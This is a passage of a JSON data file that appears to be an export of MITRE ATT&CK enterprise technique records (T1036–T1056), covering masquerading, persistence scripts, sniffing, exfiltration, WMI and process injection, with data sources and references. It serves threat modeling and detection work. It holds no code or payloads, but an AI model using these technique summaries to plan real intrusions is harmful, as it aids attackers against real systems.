    "tactic": "defense-evasion",
    "datasources": "binary-file-metadata|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1036.001",
      "T1036.002",
      "T1036.003",
      "T1036.004",
      "T1036.005",
      "T1036.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.<!-- raw HTML omitted --><!-- raw HTML omitted -->Renaming abusable system utilities to evade security monitoring is also a form of <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a>.(Citation: LOLBAS Main Site)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/177.html",
        "description": "none",
        "external_id": "CAPEC-177"
      },
      {
        "source_name": "LOLBAS Main Site",
        "url": "https://lolbas-project.github.io/",
        "description": "LOLBAS. (n.d.). Living Off The Land Binaries and Scripts (and also Libraries). Retrieved February 10, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Masquerade Ball",
        "url": "http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf",
        "description": "Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Twitter ItsReallyNick Masquerading Update",
        "url": "https://twitter.com/ItsReallyNick/status/1055321652777619457",
        "description": "Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
    "platform": "macos|windows|linux",
    "tid": "T1037",
    "technique": "Boot or Logon Initialization Scripts",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1037.001",
      "T1037.002",
      "T1037.003",
      "T1037.004",
      "T1037.005"
    ],
    "count_subtechniques": 5,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/564.html",
        "description": "none",
        "external_id": "CAPEC-564"
      }
    ]
  },
  {
    "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
    "platform": "macos|windows|linux",
    "tid": "T1037",
    "technique": "Boot or Logon Initialization Scripts",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1037.001",
      "T1037.002",
      "T1037.003",
      "T1037.004",
      "T1037.005"
    ],
    "count_subtechniques": 5,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/564.html",
        "description": "none",
        "external_id": "CAPEC-564"
      }
    ]
  },
  {
    "id": "attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c",
    "platform": "linux|macos|windows",
    "tid": "T1039",
    "technique": "Data from Network Shared Drive",
    "tactic": "collection",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within <a href=\"https://attack.mitre.org/software/S0106\">cmd</a> may be used to gather information.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/639.html",
        "description": "none",
        "external_id": "CAPEC-639"
      }
    ]
  },
  {
    "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
    "platform": "linux|macos|windows",
    "tid": "T1040",
    "technique": "Network Sniffing",
    "tactic": "credential-access",
    "datasources": "host-network-interface|netflow-enclave-netflow|network-device-logs|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.<!-- raw HTML omitted --><!-- raw HTML omitted -->Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as <a href=\"https://attack.mitre.org/techniques/T1557/001\">LLMNR/NBT-NS Poisoning and SMB Relay</a>, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.<!-- raw HTML omitted --><!-- raw HTML omitted -->Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/158.html",
        "description": "none",
        "external_id": "CAPEC-158"
      }
    ]
  },
  {
    "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
    "platform": "linux|macos|windows",
    "tid": "T1040",
    "technique": "Network Sniffing",
    "tactic": "discovery",
    "datasources": "host-network-interface|netflow-enclave-netflow|network-device-logs|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.<!-- raw HTML omitted --><!-- raw HTML omitted -->Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as <a href=\"https://attack.mitre.org/techniques/T1557/001\">LLMNR/NBT-NS Poisoning and SMB Relay</a>, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.<!-- raw HTML omitted --><!-- raw HTML omitted -->Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/158.html",
        "description": "none",
        "external_id": "CAPEC-158"
      }
    ]
  },
  {
    "id": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d",
    "platform": "linux|macos|windows",
    "tid": "T1041",
    "technique": "Exfiltration Over C2 Channel",
    "tactic": "exfiltration",
    "datasources": "netflow-enclave-netflow|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88",
    "platform": "linux|windows|macos|aws|gcp|azure",
    "tid": "T1046",
    "technique": "Network Service Scanning",
    "tactic": "discovery",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-command-line-parameters|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. <!-- raw HTML omitted --><!-- raw HTML omitted -->Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/300.html",
        "description": "none",
        "external_id": "CAPEC-300"
      }
    ]
  },
  {
    "id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
    "platform": "windows",
    "tid": "T1047",
    "technique": "Windows Management Instrumentation",
    "tactic": "execution",
    "datasources": "authentication-logs|netflow-enclave-netflow|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia SMB",
        "url": "https://en.wikipedia.org/wiki/Server_Message_Block",
        "description": "Wikipedia. (2016, June 12). Server Message Block. Retrieved June 12, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet RPC",
        "url": "https://technet.microsoft.com/en-us/library/cc787851.aspx",
        "description": "Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN WMI",
        "url": "https://msdn.microsoft.com/en-us/library/aa394582.aspx",
        "description": "Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WMI SANS 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf",
        "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WMI 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
        "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776",
    "platform": "linux|macos|windows",
    "tid": "T1048",
    "technique": "Exfiltration Over Alternative Protocol",
    "tactic": "exfiltration",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1048.001",
      "T1048.002",
      "T1048.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. <!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1048\">Exfiltration Over Alternative Protocol</a> can be done using various common operating system utilities such as <a href=\"https://attack.mitre.org/software/S0039\">Net</a>/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016)</p>\n",
    "technique_references": [
      {
        "source_name": "Palo Alto OilRig Oct 2016",
        "url": "http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/",
        "description": "Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475",
    "platform": "linux|macos|windows|aws|gcp|azure",
    "tid": "T1049",
    "technique": "System Network Connections Discovery",
    "tactic": "discovery",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary’s goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview)<!-- raw HTML omitted --><!-- raw HTML omitted -->Utilities and commands that acquire this information include <a href=\"https://attack.mitre.org/software/S0104\">netstat</a>, “net use,” and “net session” with <a href=\"https://attack.mitre.org/software/S0039\">Net</a>. In Mac and Linux, <a href=\"https://attack.mitre.org/software/S0104\">netstat</a> and <!-- raw HTML omitted -->lsof<!-- raw HTML omitted --> can be used to list current connections. <!-- raw HTML omitted -->who -a<!-- raw HTML omitted --> and <!-- raw HTML omitted -->w<!-- raw HTML omitted --> can be used to show which users are currently logged in, similar to “net session”.</p>\n",
    "technique_references": [
      {
        "source_name": "Amazon AWS VPC Guide",
        "url": "https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html",
        "description": "Amazon. (n.d.). What Is Amazon VPC?. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Azure Virtual Network Overview",
        "url": "https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-overview",
        "description": "Annamalai, N., Casey, C., Almeida, M., et. al.. (2019, June 18). What is Azure Virtual Network?. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Google VPC Overview",
        "url": "https://cloud.google.com/vpc/docs/vpc",
        "description": "Google. (2019, September 23). Virtual Private Cloud (VPC) network overview. Retrieved October 6, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e6415f09-df0e-48de-9aba-928c902b7549",
    "platform": "linux|macos|windows",
    "tid": "T1052",
    "technique": "Exfiltration Over Physical Medium",
    "tactic": "exfiltration",
    "datasources": "data-loss-prevention|file-monitoring|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1052.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
    "platform": "windows|linux|macos",
    "tid": "T1053",
    "technique": "Scheduled Task/Job",
    "tactic": "execution",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1053.001",
      "T1053.002",
      "T1053.003",
      "T1053.004",
      "T1053.005",
      "T1053.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/557.html",
        "description": "none",
        "external_id": "CAPEC-557"
      },
      {
        "source_name": "TechNet Task Scheduler Security",
        "url": "https://technet.microsoft.com/en-us/library/cc785125.aspx",
        "description": "Microsoft. (2005, January 21). Task Scheduler and security. Retrieved June 8, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
    "platform": "windows|linux|macos",
    "tid": "T1053",
    "technique": "Scheduled Task/Job",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1053.001",
      "T1053.002",
      "T1053.003",
      "T1053.004",
      "T1053.005",
      "T1053.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/557.html",
        "description": "none",
        "external_id": "CAPEC-557"
      },
      {
        "source_name": "TechNet Task Scheduler Security",
        "url": "https://technet.microsoft.com/en-us/library/cc785125.aspx",
        "description": "Microsoft. (2005, January 21). Task Scheduler and security. Retrieved June 8, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
    "platform": "windows|linux|macos",
    "tid": "T1053",
    "technique": "Scheduled Task/Job",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1053.001",
      "T1053.002",
      "T1053.003",
      "T1053.004",
      "T1053.005",
      "T1053.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/557.html",
        "description": "none",
        "external_id": "CAPEC-557"
      },
      {
        "source_name": "TechNet Task Scheduler Security",
        "url": "https://technet.microsoft.com/en-us/library/cc785125.aspx",
        "description": "Microsoft. (2005, January 21). Task Scheduler and security. Retrieved June 8, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
    "platform": "linux|macos|windows",
    "tid": "T1055",
    "technique": "Process Injection",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|dll-monitoring|file-monitoring|named-pipes|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1055.001",
      "T1055.002",
      "T1055.003",
      "T1055.004",
      "T1055.005",
      "T1055.008",
      "T1055.009",
      "T1055.011",
      "T1055.012",
      "T1055.013",
      "T1055.014"
    ],
    "count_subtechniques": 11,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. <!-- raw HTML omitted --><!-- raw HTML omitted -->There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. <!-- raw HTML omitted --><!-- raw HTML omitted -->More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/640.html",
        "description": "none",
        "external_id": "CAPEC-640"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ArtOfMemoryForensics",
        "url": "none",
        "description": "Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Acct",
        "url": "https://www.gnu.org/software/acct/",
        "description": "GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RHEL auditd",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
        "description": "Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Chokepoint preload rootkits",
        "url": "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
        "description": "stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Sysmon v6 May 2017",
        "url": "https://docs.microsoft.com/sysinternals/downloads/sysmon",
        "description": "Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
    "platform": "linux|macos|windows",
    "tid": "T1055",
    "technique": "Process Injection",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|dll-monitoring|file-monitoring|named-pipes|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1055.001",
      "T1055.002",
      "T1055.003",
      "T1055.004",
      "T1055.005",
      "T1055.008",
      "T1055.009",
      "T1055.011",
      "T1055.012",
      "T1055.013",
      "T1055.014"
    ],
    "count_subtechniques": 11,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. <!-- raw HTML omitted --><!-- raw HTML omitted -->There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. <!-- raw HTML omitted --><!-- raw HTML omitted -->More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/640.html",
        "description": "none",
        "external_id": "CAPEC-640"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ArtOfMemoryForensics",
        "url": "none",
        "description": "Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Acct",
        "url": "https://www.gnu.org/software/acct/",
        "description": "GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RHEL auditd",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
        "description": "Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Chokepoint preload rootkits",
        "url": "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
        "description": "stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Sysmon v6 May 2017",
        "url": "https://docs.microsoft.com/sysinternals/downloads/sysmon",
        "description": "Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2",
    "platform": "linux|macos|windows|network",
    "tid": "T1056",
    "technique": "Input Capture",
    "tactic": "collection",
    "datasources": "api-monitoring|binary-file-metadata|dll-monitoring|kernel-drivers|loaded-dlls|powershell-logs|process-command-line-parameters|process-monitoring|user-interface|windows-event-logs|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1056.001",
      "T1056.002",
      "T1056.003",
      "T1056.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
